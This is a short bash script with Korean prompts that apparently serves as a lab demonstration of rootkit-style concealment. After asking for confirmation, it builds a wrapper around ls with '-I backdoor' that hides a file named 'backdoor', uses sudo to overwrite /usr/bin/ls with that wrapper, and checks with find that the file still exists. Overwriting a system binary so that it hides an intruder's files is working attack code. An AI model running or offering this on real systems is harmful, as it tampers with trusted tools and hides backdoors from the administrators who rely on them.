#!/bin/bash

echo " 이 스크립트를 진행하면 /usr/bin/ls 파일에 겹쳐쓰게 됩니다!"
read -p "계속 진행하시겠습니까? (yes/no): " answer

if [ "$answer" != "yes" ]; then
    echo "작업이 취소되었습니다"
    exit
fi

echo " 스크립트를 진행합니다..."


cat << "EOF" > a
#!/bin/bash
/home/user1/ls --color=auto -I backdoor "$@"
EOF

chmod +x a

touch backdoor

echo " ./a 실행 (backdoor 숨김 확인)"

./a

echo " /usr/bin/ls 덮어쓰기"
sudo cp a /usr/bin/ls

echo " ls 실행"
ls

echo "backdoor 탐색"
find . -name backdoor
